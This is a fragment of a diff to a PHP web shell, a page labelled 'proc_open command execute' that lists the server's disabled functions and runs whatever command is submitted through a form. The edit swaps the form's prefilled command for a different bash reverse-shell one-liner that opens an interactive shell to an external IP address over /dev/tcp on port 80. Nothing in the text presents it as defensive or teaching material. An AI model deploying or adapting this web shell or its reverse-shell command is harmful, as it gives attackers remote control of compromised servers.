@@ -3,7 +3,7 @@
 
 <font face=courier size=2><i>proc_open command execute by unknown45</i> | <?php print "\n";$disable_functions = @ini_get("disable_functions"); echo "<font face=courier size=2>disable func : <i><font color=red size=2> ".$disable_functions; print "\n"; ?><br></font>
 <form method="post">
-<font face=courier new size=2>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="bash -i >& /dev/tcp/170.187.228.41/80 0>&1" style="margin: 5px auto; padding-left: 5px;" required><br>
+<font face=courier new size=2>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="bash -c 'exec bash -i &>/dev/tcp/170.187.228.41/80 <&1'" style="margin: 5px auto; padding-left: 5px;" required><br>
 <button type="submit">Execute</button>
 </form><hr>
 <?php
